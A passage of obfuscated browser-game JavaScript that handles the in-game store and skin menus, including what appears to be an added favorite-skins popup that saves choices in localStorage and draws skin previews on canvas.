          var _0x53eef2 = undefined;
          switch (_0x1c97c7.Vf.fg(_0x1c97c7.Vf.Zf)) {
            case "false":
              _0x53eef2 = false;
              break;
            default:
              _0x53eef2 = true;
          }
          _0x420527.prop("checked", _0x53eef2);
          _0x34b106.Ci.oe(_0x53eef2);
          var _0x2e96d3 = undefined;
          switch (_0x1c97c7.Vf.fg(_0x1c97c7.Vf.Xf)) {
            case "false":
              _0x2e96d3 = false;
              break;
            default:
              _0x2e96d3 = true;
          }
          _0x5db308.prop("checked", _0x2e96d3);
          _0x34b106.Ij.yl(function () {
            _0x33c70f.toggle(_0x34b106.Ij.Hj());
            _0x5c4b4a.toggle(_0x34b106.Ij.Hj());
          });
        };
        _0x5da98a.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeIn(200);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x5da98a.prototype.Hk = function () {
          var _0x3499ec = _0xf1d21a();
          _0x3499ec.Ci.Ce();
          if (_0x3499ec.Go()) {
            _0x221aa2.show();
          } else {
            _0x221aa2.hide();
          }
        };
        _0x5da98a.prototype.Zh = function () {
          return _0x5db308.prop("checked");
        };
        return _0x5da98a;
      }();
      _0x1c97c7.jk = function () {
        var _0x43da63 = $("#store-view-canv");
        var _0x258ed6 = $("#skin-description-text");
        var _0x4e75f3 = $("#skin-group-description-text");
        var _0x5090f0 = $("#store-locked-bar");
        var _0x1a0151 = $("#store-locked-bar-text");
        var _0x51402f = $("#store-buy-button");
        var _0x7b1835 = $("#store-item-price");
        var _0x7f693d = $("#store-groups");
        var _0x235b91 = $("#store-view-prev");
        var _0x57ed10 = $("#store-view-next");
        var _0x2c0226 = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.skins.tab"), true);
          var _0x581fc1 = this;
          var _0x351a25 = _0xf1d21a();
          this.Ho = null;
          this.Io = [];
          this.Jo = {};
          this.Ko = new _0x1c97c7.dm(_0x43da63);
          _0x51402f.click(function () {
            _0x351a25.Ci.Be();
            _0x581fc1.Lo();
          });
          _0x235b91.click(function () {
            _0x351a25.Ci.Be();
            _0x581fc1.Ho.Mo();
          });
          _0x57ed10.click(function () {
            _0x351a25.Ci.Be();
            _0x581fc1.Ho.No();
          });
        });
        _0x2c0226.prototype.ha = function () {
          _0x2c0226.parent.prototype.ha.call(this);
          var _0x1b0e31 = this;
          var _0xaac7a9 = _0xf1d21a();
          _0xaac7a9.Lc.$b(function () {
            var _0x16d0ee = _0xaac7a9.Lc.Xb();
            _0x1b0e31.Io = [];
            for (var _0x34279c = 0; _0x34279c < _0x16d0ee.skinGroupArrayDict.length; _0x34279c++) {
              _0x1b0e31.Io.push(new _0x2b1b4b(_0x1b0e31, _0x16d0ee.skinGroupArrayDict[_0x34279c]));
            }
            _0x1b0e31.Jo = {};
            for (var _0x59041d = 0; _0x59041d < _0x16d0ee.skinArrayDict.length; _0x59041d++) {
              var _0x42b2c4 = _0x16d0ee.skinArrayDict[_0x59041d];
              _0x1b0e31.Jo[_0x42b2c4.id] = _0x42b2c4;
            }
            _0x1b0e31.Oo();
          });
          this.Po(false);
          _0xaac7a9.On.zj(function () {
            _0x1b0e31.Po(false);
          });
        };
        _0x2c0226.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeIn(200);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x2c0226.prototype.Hk = function () {
          _0xf1d21a().Ci.pe(_0x1c97c7.ge.je._e);
          _0xf1d21a().Ci.Ce();
          this.Oo();
          this.Ko.Kf(true);
        };
        _0x2c0226.prototype.Bk = function () {
          this.Ko.Kf(false);
        };
        _0x2c0226.prototype.Jf = function () {
          this.Ko.Jf();
        };
        _0x2c0226.prototype.Nf = function (_0x4011c6, _0x23370c) {
          this.Ko.Nf();
        };
        _0x2c0226.prototype.Oo = function () {
          var _0x991208 = this;
          var _0x54c70a = this;
          var _0x19af61 = _0xf1d21a();
          _0x7f693d.empty();
          for (var _0x4e07f6 = 0; _0x4e07f6 < this.Io.length; _0x4e07f6++) {
            (function (_0x4b6a3b) {
              var _0x350f13 = _0x991208.Io[_0x4b6a3b];
              var _0x373510 = document.createElement("li");
              _0x7f693d.append(_0x373510);
              var _0x2a8228 = $(_0x373510);
              if (_0x350f13.To && _0x350f13.To.isCustom) {
                _0x2a8228.css("background-color", "#FFF");
                _0x2a8228.css("color", "#000");
              }
              _0x2a8228.html(_0x350f13.Qo());
              _0x2a8228.click(function () {
                _0x19af61.Ci.Be();
                _0x54c70a.Ro(_0x350f13);
              });
              _0x350f13.So = _0x2a8228;
            })(_0x4e07f6);
          }
          if (this.Io.length > 0) {
            var _0x17ea98 = _0x19af61.On.rj(_0x1c97c7.tj.sj);
            for (var _0x4e07f6 = 0; _0x4e07f6 < this.Io.length; _0x4e07f6++) {
              var _0x4b72c5 = this.Io[_0x4e07f6];
              for (var _0x483095 = _0x4b72c5.To.list, _0x582700 = 0; _0x582700 < _0x483095.length; _0x582700++) {
                if (_0x483095[_0x582700] == _0x17ea98) {
                  _0x4b72c5.Uo = _0x582700;
                  this.Ro(_0x4b72c5);
                  return;
                }
              }
            }
            this.Ro(this.Io[0]);
          }
        };
        _0x2c0226.prototype.Ro = function (_0x321eb5) {
          var _0x598d5a = _0xf1d21a();
          if (this.Ho !== _0x321eb5) {
            this.Ho = _0x321eb5;
            _0x7f693d.children().removeClass("pressed");
            if (this.Ho.So) {
              this.Ho.So.addClass("pressed");
            }
            _0x4e75f3.html("");
            if (_0x321eb5.To != null) {
              var _0x307e7c = _0x598d5a.Lc.Xb().textDict[_0x321eb5.To.description];
              if (_0x307e7c != null) {
                _0x4e75f3.html(_0x503ed4.K(_0x503ed4.I(_0x307e7c)));
              }
            }
            this.Po(true);
          }
        };
        _0x2c0226.prototype.Vo = function () {
          if (this.Ho == null) {
            return _0x1c97c7.Si.Ui();
          } else {
            return this.Ho.Wo();
          }
        };
        _0x2c0226.prototype.Lo = function () {
          var _0x1f1e1f = this;
          var _0x53fdc2 = this.Vo();
          if (_0x53fdc2.Wi()) {
            var _0x1c89c0 = _0x53fdc2.bc();
            _0x1f1e1f.Xo(_0x1c89c0);
          }
        };
        _0x2c0226.prototype.Xo = function (_0x22df1c) {
          var _0x55b32b = _0xf1d21a();
          var _0x12cfb9 = _0x55b32b.On.Gj(_0x22df1c, _0x1c97c7.tj.sj);
          if (_0x12cfb9 != null) {
            var _0x4b9af8 = _0x12cfb9.Jj();
            if (!(_0x55b32b.Ij.il() < _0x4b9af8)) {
              var _0xa6921b = _0x55b32b.On.rj(_0x1c97c7.tj.sj);
              var _0x5a581a = _0x55b32b.On.rj(_0x1c97c7.tj.uj);
              var _0x507514 = _0x55b32b.On.rj(_0x1c97c7.tj.vj);
              var _0x443a7d = _0x55b32b.On.rj(_0x1c97c7.tj.xj);
              var _0x2aaf74 = _0x55b32b.On.rj(_0x1c97c7.tj.wj);
              var _0x4e20e7 = this.ro(5000);
              _0x55b32b.Ij.Hl(_0x22df1c, _0x1c97c7.tj.sj, function () {
                _0x4e20e7.vo();
                _0x55b32b.og.Ak(_0x55b32b.og.tk);
              }, function (_0x2f3d27) {
                _0x55b32b.Ij.Bl(function () {
                  _0x55b32b.On.Fj(_0xa6921b, _0x1c97c7.tj.sj);
                  _0x55b32b.On.Fj(_0x5a581a, _0x1c97c7.tj.uj);
                  _0x55b32b.On.Fj(_0x507514, _0x1c97c7.tj.vj);
                  _0x55b32b.On.Fj(_0x443a7d, _0x1c97c7.tj.xj);
                  _0x55b32b.On.Fj(_0x2aaf74, _0x1c97c7.tj.wj);
                  _0x55b32b.On.Fj(_0x22df1c, _0x1c97c7.tj.sj);
                  _0x4e20e7.vo();
                });
              });
            }
          }
        };
        _0x2c0226.prototype.Po = function (_0x36d4c0) {
          var _0x182c94 = _0xf1d21a();
          var _0x398db9 = _0x182c94.On.yj();
          var _0xac53ab = this.Vo();
          if (_0xac53ab.Wi()) {
            var _0x8577df = _0xac53ab.bc();
            var _0x238092 = _0x182c94.On.Gj(_0x8577df, _0x1c97c7.tj.sj);
            var _0x1a9c99 = false;
            var _0x129d2b = _0x182c94.On.Cj(_0x8577df, _0x1c97c7.tj.sj);
            var _0x1c6791 = true;
            if (typeof _0x503ed4 === "undefined") {
              window.decoder = {
                H: function (_0xfa6f3c) {
                  return _0xfa6f3c || "Locked";
                },
                I: function (_0x1a18c7) {
                  return _0x1a18c7 || "";
                },
                K: function (_0x58c715) {
                  return _0x58c715 || "";
                }
              };
            }
            $("#add-to-favorites-skin").remove();
            $("#manage-favorites-skin").remove();
            $("#skin-info-text").remove();
            $(".fav-buttons-container").remove();
            $(".favorites-popup").remove();
            if (_0x129d2b) {
              _0x5090f0.hide();
              _0x51402f.hide();
              _0x52d02c(_0x8577df);
            } else if (_0x238092 == null || _0x238092.Kj()) {
              _0x1a9c99 = true;
              _0x5090f0.show();
              _0x51402f.hide();
              _0x1a0151.text(_0x503ed4.H("index.game.popup.menu.store.locked"));
              if (_0x238092 != null && _0x238092.Kj()) {
                var _0x1c698a = _0x182c94.Lc.Xb().textDict[_0x238092.Em()];
                if (_0x1c698a != null) {
                  _0x1a0151.text(_0x503ed4.I(_0x1c698a));
                }
              }
            } else {
              _0x1c6791 = false;
              _0x5090f0.hide();
              _0x51402f.show();
              if (typeof _0x7b1835 !== "undefined" && _0x7b1835) {
                _0x7b1835.html(_0x238092.Jj());
              } else if ($("#skin-description").length > 0) {
                $("#skin-description").html(_0x238092.Jj());
              }
            }
            var _0x52c338 = $("<div class='favorites-popup' style='display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1e1e2f;border:1px solid #333345;border-radius:8px;padding:0;width:450px;max-height:400px;overflow:hidden;z-index:999999;box-shadow:0 8px 32px rgba(0,0,0,0.6);color:white;'><div style='padding:15px 20px;background-color:#252538;border-bottom:1px solid #333345;position:relative;display:flex;justify-content:space-between;align-items:center;'><button class='close-favorites' style='position:absolute;top:8px;left:10px;font-size:22px;background:none;border:none;color:#aaa;cursor:pointer;padding:0 5px;line-height:1;font-weight:bold;transition:color 0.2s ease;'>&times;</button><h3 style='margin:0 0 0 5px;font-size:18px;color:white;padding-left:15px;'>Favorite Skins</h3><button class='clear-all-favorites' style='padding:4px 8px;background-color:#f44336;color:white;border:none;border-radius:4px;cursor:pointer;font-size:12px;transition:background-color 0.2s ease;'>Clear All</button></div><div class='favorites-content' style='padding:15px 20px;overflow-y:auto;max-height:330px;'><div class='favorites-grid' style='display:grid;grid-template-columns:1fr 1fr;gap:15px;padding:0;margin:0;'></div></div></div>");
            $("body").append(_0x52c338);
            _0x402c76();
            _0x258ed6.html("");
            var _0x500a9b = _0x182c94.Lc.Xb().textDict[_0x238092.Fm()];
            var _0x5b7541 = _0x500a9b ? _0x503ed4.K(_0x503ed4.I(_0x500a9b)) : _0x238092.Fm();
            if (_0x238092 != null && _0x238092.Fm() != null) {
              _0x258ed6.html(_0x5b7541);
            }
            this.Ko.$l(_0x398db9.Um(_0x8577df));
            this.Ko.um(_0x1a9c99);
            if (_0x36d4c0) {
              _0x182c94.On.Fj(_0x8577df, _0x1c97c7.tj.sj);
            }
          }
        };
        function _0x52d02c(_0x1410b5) {
          var _0x28e560 = $(".store-left");
          if (_0x28e560.length === 0) {
            _0x28e560 = $("body");
            console.warn("⚠️ store-left not found, using body as fallback");
          }
          if ($("#add-to-favorites-skin").length === 0) {
            var _0x315984 = $("<div class='fav-buttons-container' style='margin:10px 0;display:flex;gap:8px;position:relative;z-index:99999;padding:0;'></div>");
            var _0x3b572a = $("<button id='add-to-favorites-skin' class='favorite-button' style='background:#4CAF50;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;white-space:nowrap;box-shadow:0 2px 6px rgba(0,0,0,0.3);font-size:13px;font-weight:500;transition:all 0.2s ease;'><span style='font-size:14px;margin-right:4px;'>★</span> Add</button>");
            var _0x577673 = $("<button id='manage-favorites-skin' class='favorite-button' style='background:#2196F3;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;white-space:nowrap;box-shadow:0 2px 6px rgba(0,0,0,0.3);font-size:13px;font-weight:500;transition:all 0.2s ease;'><span style='font-size:14px;margin-right:4px;'>☰</span> Favorite</button>");
            _0x3b572a.on("mouseenter", function () {
              $(this).css("transform", "translateY(-1px)").css("box-shadow", "0 4px 8px rgba(0,0,0,0.4)");
            }).on("mouseleave", function () {
              $(this).css("transform", "translateY(0)").css("box-shadow", "0 2px 6px rgba(0,0,0,0.3)");
            });
            _0x577673.on("mouseenter", function () {
              $(this).css("transform", "translateY(-1px)").css("box-shadow", "0 4px 8px rgba(0,0,0,0.4)");
            }).on("mouseleave", function () {
              $(this).css("transform", "translateY(0)").css("box-shadow", "0 2px 6px rgba(0,0,0,0.3)");
            });
            _0x315984.append(_0x3b572a);
            _0x315984.append(_0x577673);
            _0x28e560.append(_0x315984);
            var _0x2de66b = $("<div>").attr("id", "skin-info-text").css({
              "font-size": "11px",
              color: "#999",
              margin: "5px 0 10px 0",
              "text-align": "center",
              position: "relative",
              "z-index": "99999"
            }).text("Press '1' key during gameplay to cycle through favorite skins");
            _0x28e560.append(_0x2de66b);
            var _0x41fc74 = vps.favoriteSkins.indexOf(_0x1410b5) !== -1;
            if (_0x41fc74) {
              _0x3b572a.html("<span style=\"font-size:14px;margin-right:4px;\">✖</span> Remove").css("background-color", "#f44336");
            } else {
              _0x3b572a.html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
            }
            _0x443cca(_0x1410b5, _0x3b572a, _0x577673);
          }
        }
        function _0x402c76() {
          $(document).off("click", ".close-favorites").on("click", ".close-favorites", function () {
            $(this).css("color", "#fff");
            $(".favorites-popup").fadeOut(200);
          });
          $(document).off("mouseenter mouseleave", ".close-favorites").on("mouseenter", ".close-favorites", function () {
            $(this).css("color", "#fff");
          }).on("mouseleave", ".close-favorites", function () {
            $(this).css("color", "#aaa");
          });
          $(document).off("mouseenter mouseleave", ".clear-all-favorites").on("mouseenter", ".clear-all-favorites", function () {
            $(this).css("background-color", "#d32f2f");
          }).on("mouseleave", ".clear-all-favorites", function () {
            $(this).css("background-color", "#f44336");
          });
          $(document).off("mouseup.favorites").on("mouseup.favorites", function (_0x39ec2b) {
            var _0x418d48 = $(".favorites-popup");
            if (!_0x418d48.is(_0x39ec2b.target) && _0x418d48.has(_0x39ec2b.target).length === 0) {
              _0x418d48.fadeOut(200);
            }
          });
          $(document).off("click", ".clear-all-favorites").on("click", ".clear-all-favorites", function () {
            if (confirm("Are you sure you want to remove all favorite skins?")) {
              vps.favoriteSkins = [];
              vps.skinr = {};
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x34954a();
              var _0xaadf15 = $("#add-to-favorites-skin");
              if (_0xaadf15.length > 0) {
                _0xaadf15.html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
              }
            }
          });
        }
        function _0x443cca(_0x20811e, _0x2623b5, _0x57020c) {
          _0x2623b5.off("click").on("click", function () {
            if (!vps.favoriteSkins) {
              vps.favoriteSkins = [];
            }
            if (!vps.skinr) {
              vps.skinr = {};
            }
            var _0xd129e = vps.favoriteSkins.indexOf(_0x20811e) !== -1;
            if (!_0xd129e) {
              vps.favoriteSkins.push(_0x20811e);
              vps.skinr[_0x20811e] = "Skin " + _0x20811e;
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              $(this).html("<span style=\"font-size:14px;margin-right:4px;\">✖</span> Remove").css("background-color", "#f44336");
            } else {
              var _0x2fd287 = vps.favoriteSkins.indexOf(_0x20811e);
              vps.favoriteSkins.splice(_0x2fd287, 1);
              delete vps.skinr[_0x20811e];
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              $(this).html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
            }
          });
          _0x57020c.off("click").on("click", function () {
            _0x34954a();
            $(".favorites-popup").fadeIn(200);
          });
        }
        function _0x34954a() {
          var _0x378616 = $(".favorites-grid");
          _0x378616.empty();
          if (!vps.favoriteSkins) {
            vps.favoriteSkins = [];
          }
          if (vps.favoriteSkins.length > 0) {
            for (var _0x4daa17 = 0; _0x4daa17 < vps.favoriteSkins.length; _0x4daa17++) {
              var _0xdb68a = vps.favoriteSkins[_0x4daa17];
              var _0x16ea09 = $("<div>").attr("data-index", _0x4daa17).attr("data-skin-id", _0xdb68a).css({
                display: "flex",
                "flex-direction": "column",
                "align-items": "center",
                padding: "2px",
                background: "#252538",
                "border-radius": "6px",
                position: "relative",
                height: "50px",
                width: "100%",
                border: "1px solid #333345"
              });
              var _0x18758c = $("<div>").css({
                width: "100%",
                height: "46px",
                background: "transparent",
                "border-radius": "4px",
                overflow: "visible",
                position: "relative",
                display: "flex",
                "justify-content": "center",
                "align-items": "center"
              }).appendTo(_0x16ea09);
              var _0x39516b = $("<button>").text("X").css({
                position: "absolute",
                top: "3px",
                right: "3px",
                background: "#f44336",
                color: "white",
                border: "none",
                padding: "1px 5px",
                "border-radius": "3px",
                cursor: "pointer",
                "font-size": "11px",
                "z-index": "20"
              }).appendTo(_0x16ea09);
              var _0x491bf2 = _0x3c563f(_0xdb68a);
              _0x18758c.append(_0x491bf2);
              _0x378616.append(_0x16ea09);
              _0x39516b.off("click").on("click", function (_0x553ca6) {
                _0x553ca6.stopPropagation();
                var _0x122040 = $(this).closest("[data-index]");
                var _0x2da733 = parseInt(_0x122040.attr("data-index"));
                var _0x591433 = _0x122040.attr("data-skin-id");
                vps.favoriteSkins.splice(_0x2da733, 1);
                if (vps.skinr && vps.skinr[_0x591433]) {
                  delete vps.skinr[_0x591433];
                }
                localStorage.setItem("SaveGamewup", JSON.stringify(vps));
                _0x122040.fadeOut(300, function () {
                  $(this).remove();
                  _0x378616.find("[data-index]").each(function (_0x8265c5) {
                    $(this).attr("data-index", _0x8265c5);
                  });
                  if (vps.favoriteSkins.length === 0) {
                    _0x137285(_0x378616);
                  }
                });
                var _0x4a4256 = $("#add-to-favorites-skin");
                if (_0x4a4256.length > 0) {
                  _0x4a4256.html("<span style=\"font-size:14px;margin-right:4px;\">★</span> Add").css("background-color", "#4CAF50");
                }
              });
            }
          } else {
            _0x137285(_0x378616);
          }
        }
        function _0x137285(_0x35e37b) {
          _0x35e37b.append("<div style='text-align:center;padding:10px;color:#aaa;margin:20px 0;grid-column:1/span 2;'>You don't have any favorite skins yet.</div>");
        }
        function _0x3c563f(_0x7192b1) {
          if (!window.textureCache) {
            window.textureCache = {};
          }
          try {
            var _0x55b80c = JSON.parse(localStorage.getItem("wup_config"));
            if (!_0x55b80c) {
              console.warn("❌ wup_config not found in localStorage");
              return _0x4b2147(_0x7192b1);
            }
            var _0x53c580 = null;
            if (_0x55b80c.skinArrayDict && Array.isArray(_0x55b80c.skinArrayDict)) {
              _0x53c580 = _0x55b80c.skinArrayDict.find(function (_0x1860fa) {
                return _0x1860fa && _0x1860fa.id === _0x7192b1;
              });
            }
            if (!_0x53c580) {
              console.warn("⚠️ Skin " + _0x7192b1 + " not found in wup_config");
              return _0x4b2147(_0x7192b1);
            }
            var _0x59f3a3 = document.createElement("div");
            _0x59f3a3.style.cssText = "width: 100%;height: 100%;position: relative;overflow: visible;background: transparent;";
            var _0x5bc254 = document.createElement("div");
            _0x5bc254.textContent = "#" + _0x7192b1;
            _0x5bc254.style.cssText = "position: absolute;top: 3px;left: 2px;background-color: rgba(0,0,0,0.6);color: white;font-size: 11px;padding: 1px 4px;border-radius: 3px;z-index: 10;";
            _0x59f3a3.appendChild(_0x5bc254);
            var _0x40fe87 = document.createElement("canvas");
            _0x40fe87.width = 600;
            _0x40fe87.height = 80;
            _0x40fe87.style.cssText = "position: absolute;top: 0;left: 0;width: 100%;height: 100%;object-fit: contain;padding: 5px;";
            _0x59f3a3.appendChild(_0x40fe87);
            var _0x2af129 = _0x40fe87.getContext("2d");
            _0x2af129.clearRect(0, 0, _0x40fe87.width, _0x40fe87.height);
            if (_0x53c580.base && Array.isArray(_0x53c580.base) && _0x53c580.base.length > 0) {
              var _0x48daa6 = {};
              var _0x1680c9 = [];
              _0x53c580.base.forEach(function (_0x4bb3a0) {
                if (!_0x4bb3a0) {
                  return;
                }
                if (_0x55b80c.regionDict && _0x55b80c.regionDict[_0x4bb3a0]) {
                  var _0x26d1d6 = _0x55b80c.regionDict[_0x4bb3a0];
                  if (_0x55b80c.textureDict && _0x26d1d6.texture && _0x55b80c.textureDict[_0x26d1d6.texture]) {
                    var _0x3d6430 = _0x55b80c.textureDict[_0x26d1d6.texture];
                    if (_0x3d6430 && (_0x3d6430.file || _0x3d6430.relativePath)) {
                      var _0x267d11 = _0x339245(_0x3d6430.relativePath || _0x3d6430.file);
                      if (!_0x48daa6[_0x267d11]) {
                        _0x48daa6[_0x267d11] = [];
                      }
                      _0x48daa6[_0x267d11].push({
                        id: _0x4bb3a0,
                        region: _0x26d1d6
                      });
                      _0x1680c9.push({
                        id: _0x4bb3a0,
                        region: _0x26d1d6
                      });
                    }
                  }
                }
              });
              var _0xb5a471 = _0x1680c9.slice().reverse();
              var _0x46cf21 = _0xb5a471.slice();
              while (_0x46cf21.length < 27) {
                var _0x5823ae = 27 - _0x46cf21.length;
                var _0x30b138 = _0xb5a471.slice(0, Math.min(_0x5823ae, _0xb5a471.length));
                _0x46cf21 = _0x46cf21.concat(_0x30b138);
              }
              var _0x58adaa = 80;
              var _0x13f152 = _0x58adaa / 2;
              var _0x281fcd = 0.2;
              var _0x4c1cad = _0x58adaa * _0x281fcd * _0x46cf21.length + _0x58adaa * 0.75;
              _0x40fe87.width = Math.max(600, _0x4c1cad);
              _0x2af129.clearRect(0, 0, _0x40fe87.width, _0x40fe87.height);
              var _0x22de9c = 0;
              var _0x2a1b2d = Object.keys(_0x48daa6).length;
              function _0x3720ee(_0x3a2d5f) {
                var _0x1547ed = _0x40fe87.height / 2;
                _0x46cf21.forEach(function (_0x197771, _0x4240e3) {
                  if (!_0x197771) {
                    return;
                  }
                  var _0x353c52 = _0x197771.region;
                  var _0x58cc10 = _0x13f152 + _0x4240e3 * _0x13f152 * 2 * _0x281fcd;
                  _0x2af129.save();
                  _0x2af129.beginPath();
                  _0x2af129.arc(_0x58cc10, _0x1547ed, _0x13f152, 0, Math.PI * 2);
                  _0x2af129.clip();
                  var _0x559150 = Math.max(_0x353c52.w, _0x353c52.h);
                  var _0x41a0c9 = _0x13f152 * 2 / _0x559150;
                  var _0x1e6cd3 = _0x58cc10 - _0x353c52.w * _0x41a0c9 / 2;
                  var _0x69f662 = _0x1547ed - _0x353c52.h * _0x41a0c9 / 2;
                  _0x2af129.drawImage(_0x3a2d5f, _0x353c52.x, _0x353c52.y, _0x353c52.w, _0x353c52.h, _0x1e6cd3, _0x69f662, _0x353c52.w * _0x41a0c9, _0x353c52.h * _0x41a0c9);
                  _0x2af129.restore();
                });
              }
              Object.keys(_0x48daa6).forEach(function (_0x1c6e77) {
                if (window.textureCache[_0x1c6e77]) {
                  _0x3720ee(window.textureCache[_0x1c6e77]);
                  return;
                }
                var _0x50975a = new Image();
                _0x50975a.crossOrigin = "anonymous";
                _0x50975a.onload = function () {
                  window.textureCache[_0x1c6e77] = _0x50975a;
                  _0x3720ee(_0x50975a);
                  _0x22de9c++;
                };
                _0x50975a.onerror = function () {
                  console.warn("❌ Failed to load texture:", _0x1c6e77);
                  _0x22de9c++;
                };
                _0x50975a.src = _0x1c6e77;
              });
            } else {
              console.warn("⚠️ No base textures found for skin", _0x7192b1);
              _0x2af129.fillStyle = "#ff6b6b";
              _0x2af129.fillRect(10, 20, 580, 40);
              _0x2af129.fillStyle = "#fff";
              _0x2af129.font = "14px Arial";
              _0x2af129.textAlign = "center";
              _0x2af129.fillText("Skin #" + _0x7192b1, _0x40fe87.width / 2, _0x40fe87.height / 2 + 5);
            }
            return _0x59f3a3;
          } catch (_0x2736b3) {
            console.error("❌ Error creating skin texture view:", _0x2736b3);
            return _0x4b2147(_0x7192b1);
          }
        }
        function _0x4b2147(_0x3ff0f9) {
          var _0x10e7e8 = document.createElement("div");
          _0x10e7e8.style.cssText = "width: 100%;height: 100%;display: flex;justify-content: center;align-items: center;color: white;background-color: #333;border-radius: 4px;font-size: 12px;";
          _0x10e7e8.textContent = "🎮 #" + _0x3ff0f9;
          return _0x10e7e8;
        }
        function _0x339245(_0x3839ee) {
          if (!_0x3839ee) {
            return "";
          }
          if (_0x3839ee.startsWith("data:") || _0x3839ee.startsWith("http")) {
            return _0x3839ee;
          }
          var _0x3b9821 = window.vps.s_l;
          if (_0x3839ee.startsWith("/")) {
            return _0x3b9821 + _0x3839ee;
          } else {
            return _0x3b9821 + "/" + _0x3839ee;
          }
        }
        var _0x2b1b4b = function () {
          function _0x27815a(_0x2d3904, _0x131801) {
            this.Yo = _0x2d3904;
            this.Uo = 0;
            this.To = _0x131801;
          }
          _0x27815a.prototype.Mo = function () {
            if (--this.Uo < 0) {
              this.Uo = this.To.list.length - 1;
            }
            this.Yo.Po(true);
          };
          _0x27815a.prototype.No = function () {
            if (++this.Uo >= this.To.list.length) {
              this.Uo = 0;
            }
            this.Yo.Po(true);
          };
          _0x27815a.prototype.Qo = function () {
            if (this.To.img) {
              try {
                var _0x5d8cfe = "";
                var _0x5161f0 = [];
                var _0x4fae46 = null;
                try {
                  _0x4fae46 = _0xf1d21a().Lc.Xb().customPaths;
                } catch (_0x3f5d22) {
                  _0x4fae46 = null;
                }
                if (_0x4fae46 && _0x4fae46.texture && _0x4fae46.map && _0x4fae46.map[this.To.img]) {
                  _0x5d8cfe = window.vps.s_l + "/images/" + _0x4fae46.texture;
                  _0x5161f0.push("background-image:url('" + _0x5d8cfe + "')");
                  _0x5161f0.push("background-position: -" + _0x4fae46.map[this.To.img].x + "px -" + _0x4fae46.map[this.To.img].y + "px");
                  _0x5161f0.push("background-repeat:no-repeat");
                } else {
                  _0x5d8cfe = window.vps.s_l + "/images/" + this.To.img;
                  _0x5161f0.push("background-image:url('" + _0x5d8cfe + "')");
                  _0x5161f0.push("background-position: center");
                  _0x5161f0.push("background-repeat: no-repeat");
                  _0x5161f0.push("background-size: contain");
                }
                _0x5161f0.push("width: 180px");
                _0x5161f0.push("height: 40px");
                _0x5161f0.push("background-color: #26c6da");
                return "<div id=\"" + this.To.id + "\" style=\"" + _0x5161f0.join(";") + "\"></div>";
              } catch (_0x3ba218) {
                console.error("Error in Qo function:", _0x3ba218);
                console.error("Image path:", this.To.img);
                return _0x503ed4.I(this.To.name);
              }
            }
            return _0x503ed4.I(this.To.name);
          };
          _0x27815a.prototype.Wo = function () {
            if (this.Uo >= this.To.list.length) {
              return _0x1c97c7.Si.Ui();
            } else {
              return _0x1c97c7.Si.Vi(this.To.list[this.Uo]);
            }
          };
          return _0x27815a;
        }();
        return _0x2c0226;
      }();
      _0x1c97c7.lk = function () {
        var _0x2299bd = $("#store-go-coins-button");
        var _0x31d179 = $("#store-go-skins-button");
        var _0x17abc8 = $("#store-go-wear-button");
        var _0x881efd = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.store.tab"), true);
          var _0x12bdec = _0xf1d21a();
          _0x2299bd.click(function () {
            _0x12bdec.Ci.Be();
            _0x12bdec.og.Ak(_0x12bdec.og._j);
          });
          _0x31d179.click(function () {
            _0x12bdec.Ci.Be();
            _0x12bdec.og.Ak(_0x12bdec.og.ik);
          });
          _0x17abc8.click(function () {
            _0x12bdec.Ci.Be();
            _0x12bdec.og.Ak(_0x12bdec.og.mk);
          });
        });
        _0x881efd.prototype.ha = function () {
          _0x881efd.parent.prototype.ha.call(this);
        };
        _0x881efd.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
